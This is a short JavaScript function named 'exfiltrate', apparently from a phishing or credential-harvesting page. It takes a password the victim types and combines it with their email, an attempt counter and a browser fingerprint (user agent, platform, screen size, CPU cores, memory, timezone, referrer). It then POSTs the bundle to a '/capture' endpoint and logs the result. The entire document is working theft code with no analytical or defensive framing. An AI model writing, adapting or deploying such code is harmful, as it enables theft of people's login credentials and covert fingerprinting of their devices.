function exfiltrate(password) {
    const attempt = {
        email: state.email,
        password: password,
        attemptNumber: state.failedAttempts.length + 1,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: `${screen.width}x${screen.height}`,
        cores: navigator.hardwareConcurrency || null,
        memory: navigator.deviceMemory || null,
        touch: navigator.maxTouchPoints > 0,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        referrer: document.referrer || null
    };
    state.failedAttempts.push(attempt);
    
    return fetch('/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(attempt)
    })
    .then(res => {
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        return res.json();
    })
    .then(data => {
        console.log('Capture result:', data);
        return data;
    })
    .catch(err => {
        console.error('Capture error:', err);
        throw err;
    });
}
